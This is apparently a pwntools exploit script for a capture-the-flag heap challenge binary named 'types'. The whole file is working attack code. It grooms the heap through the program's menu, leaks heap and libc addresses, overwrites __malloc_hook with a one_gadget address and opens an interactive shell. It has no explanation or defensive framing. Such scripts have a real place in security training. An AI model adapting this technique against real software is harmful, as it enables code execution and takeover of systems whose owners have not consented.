from pwn import *

elf=ELF("./types")
libc=ELF("./libc.so.6")

p=process("./types")
#p=remote("localhost", 12345)
print p.recv()

def add_type(choice, data):
    p.sendline("1")
    print p.recv()
    p.sendline(str(choice))
    print p.recv()
    p.sendline(data)
    print p.recv()
    p.sendline("4")
    time.sleep(0.1)
    print p.recv()

def init_type(idx):
    p.sendline("4")
    print p.recv()
    p.sendline(str(idx))
    print p.recv()
    p.sendline("1")
    time.sleep(0.1)
    print p.recv()

def delete_type(idx):
    p.sendline("4")
    print p.recv()
    p.sendline(str(idx))
    print p.recv()
    p.sendline("2")
    time.sleep(0.1)
    print p.recv()

def edit_type(idx, data):
    p.sendline("3")
    print p.recv()
    p.sendline(str(idx))
    print p.recv()
    p.sendline(data)
    time.sleep(0.1)
    print p.recv()

add_type(3, "AAAAAAAA")
add_type(3, "BBBBBBBB")
add_type(3, "C"*0x100)
delete_type(2)
init_type(0)

p.sendline("2")
print p.recv()
p.sendline("0")
print p.recvuntil(" : ")
heap_base = int(p.recvline().strip()) - 0x11c50
print p.recv()
target = heap_base + 0x11cb0
target2 = heap_base + 0x11db0

add_type(1, str(target))
init_type(2)
edit_type(2, p64(target2)[:-1])

p.sendline("2")
print p.recv()
p.sendline("1")
libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78
libc.address = libc_base
malloc_hook = libc.symbols['__malloc_hook']
one_shot = libc_base + 0xf1147
print p.recv()


edit_type(2, p64(malloc_hook)[:-1])
edit_type(1, p64(one_shot)[:-1])

p.sendline("1")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("1")

print 'heap_base -> ', hex(heap_base)
print 'libc_base -> ', hex(libc_base)


p.interactive()
